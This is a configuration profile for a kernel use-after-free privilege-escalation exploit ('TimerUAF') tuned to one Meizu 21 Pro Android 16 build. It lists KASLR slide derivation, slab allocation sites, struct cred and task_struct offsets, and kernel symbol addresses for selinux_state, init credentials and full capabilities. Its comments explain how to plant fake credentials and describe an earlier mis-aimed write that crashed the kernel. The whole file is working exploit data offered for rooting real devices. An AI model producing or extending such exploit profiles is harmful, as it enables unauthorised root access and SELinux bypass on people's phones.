# TimerUAF kernel profile (HOCON; JSON remains valid) -- DIRTY KERNEL
# Device: Meizu 21 Pro, Flyme 12.6.0.0A (Android 16, SDK 36)
#   ro.product.system.model=MEIZU 21 Pro
#   ro.build.version.release=16 / ro.build.version.sdk=36
#   fingerprint=meizu/meizu_21Pro_CN/meizu21Pro:16/BQ2A.251016.001-BP2A.250605.031.A3/1763701752:user/release-keys
#
# This kernel's release string ("-maybe-dirty") is not unique to one vendor
# build, so it lives under dirty/ and UserService additionally verifies the
# identity fields below against the device before using this conf.
# Identity uses only AOSP-standard properties (no vendor build strings).
#
# Derived from the OTA Image (Android/Meizu/21Pro/update.zip on the SMB share):
#   _text = 0xffffffc008000000, slide = 0x17ae600000 (2MB aligned).
#   The previous profile carried a 17-digit timer_site and 6.6 task_struct
#   constants; every value below is re-derived for 6.1.25.
device_model = "MEIZU 21 Pro"
android_release = "16"
sdk_int = 36

release = "6.1.25-android14-11-maybe-dirty"
schema_version = 1
ksu_kmi = "android14-6.1"

# do_timer_create -> kmem_cache_alloc(posix_timers_cache) call site
# posix_timers_cache = kmem_cache_create(..., size=0x108, align=0, flags=0x4040000, ctor=NULL)
# (SLAB_ACCOUNT only, no SLAB_HWCACHE_ALIGN -> object size stays 0x108)
#
# timer_site is the link-time address of the call site; the exploit compares
# only its low 21 bits (KASLR slides the image by whole 2MB blocks) and derives
# the runtime slide from the full value.  Verified on device (tools/site_probe,
# MEIZU 21 Pro, 6.1.25-android14-11-maybe-dirty): the trace event reports
# call_site = bl+4, observed 0xffffffd7b6790578, i.e. low21 = 0x190578.
#
# Derived from the OTA Image (conf/dirty/../.. SMB share, update.zip -> boot):
#   _text = 0xffffffc008000000, slide = 0x17ae600000 (2MB aligned)
#   do_timer_create's kmem_cache_alloc bl is at Image offset 0x190574, so
#   timer_site = _text + 0x190578.
timer_site = 0xffffffc008190578
timer_alloc = 0x108

# cred_jar: sizeof(struct cred)=0xb0, slab object=0xc0
# cred_init: kmem_cache_create("cred_jar", 0xb0, 0, 0x40402000, NULL)
# flags 0x40402000 = SLAB_ACCOUNT|SLAB_DEBUG_OBJECTS|SLAB_HWCACHE_ALIGN(0x2000)
# -> SLUB calculate_sizes rounds size up to cache line(64B): ALIGN(0xb0,64)=0xc0
#
# struct cred layout for 6.1.25, verified against the kernel Image extracted
# from Android/Meizu/21Pro/update.zip and against the device:
#   - init_cred in .data shows user@0x80, user_ns@0x88, ucounts@0x90,
#     group_info@0x98 and the caps at 0x28/0x30/0x38/0x40/0x48 (inh=0,
#     prm/eff/bset=full, amb=0 -- exactly the init_cred initialiser)
#   - prepare_creds() disassembly: memcpy(new, old, 0xb0), usage@0,
#     get_uid([+0x80]), get_group_info([+0x98]), and current->cred loaded
#     from [SP_EL0 + 0x838], which also confirms task_cred_off
#   - security_prepare_creds() disassembly: kmem_cache_zalloc(task_sec_cache)
#     followed by "str x0, [x21, #0x78]", i.e. cred->security @ 0x78
# The 4-byte atomic_t usage (uid@0x4) shifts the whole struct down by 8
# relative to the 6.6/6.12 layout, so every offset below differs from the
# other profiles.  euid@0x14 needs its own zero plant because rb_erase leaves
# the rb_left target in c[2], which lands on euid in this layout.
cred_req = 0xb0
cred_alloc = 0xc0
cred_uid_off = 0x4
cred_euid_off = 0x14
cred_cap_off = 0x28
cred_cap_count = 5
cred_security_off = 0x78
cred_user_off = 0x80
cred_userns_off = 0x88
cred_ucounts_off = 0x90
cred_group_off = 0x98

# link-time symbols (kallsyms)
selinux_state = 0xffffffc00a0b19c8
panic_on_warn = 0xffffffc009e7ae10

# task_struct / cred layout (BTF from /sys/kernel/btf/vmlinux on the device)
# 6.1.25: sizeof(task_struct) = 0x12c0 and task_struct_cachep's slab object
# is 0x12c0.  site_probe on the device shows dup_task_struct's
# kmem_cache_alloc_node call site at low21 0xaed3c with req=alloc=0x12c0.
# The previous 0xad2b8 / 0x400 pair matched a different 0x3c8-byte allocation
# instead, so g_child_task pointed at that object and the fake-cred write
# landed 0x838 bytes past it, corrupting kernel memory and panicking kswapd
# in page_vma_mapped_walk().
# cred at 0x838 (BTF: task_struct.cred; real_cred is 0x830).
task_cred_off = 0x838
copy_process_low21 = 0xaed3c
task_alloc_bytes = 0x12c0

# capability and fake-cred refcounted sub-objects
fullcap = 0x1ffffffffff
root_user = 0xffffffc009ea1608
init_user_ns = 0xffffffc009ea1378
init_ucounts = 0xffffffc009ea2e90
init_groups = 0xffffffc009ea2928

# task_security_struct
selinux_blob_off = 0x8
selinux_sid_kernel = 1
